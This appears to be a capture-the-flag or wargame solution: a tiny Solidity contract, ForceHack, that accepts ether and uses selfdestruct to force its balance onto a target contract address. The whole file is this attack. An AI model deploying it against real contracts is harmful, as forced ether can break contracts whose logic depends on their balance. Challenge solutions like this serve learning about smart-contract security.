pragma solidity ^0.4.18;

contract ForceHack{
    function attack(address _instance) public {
        selfdestruct(_instance);
    }

    function () public payable{}
}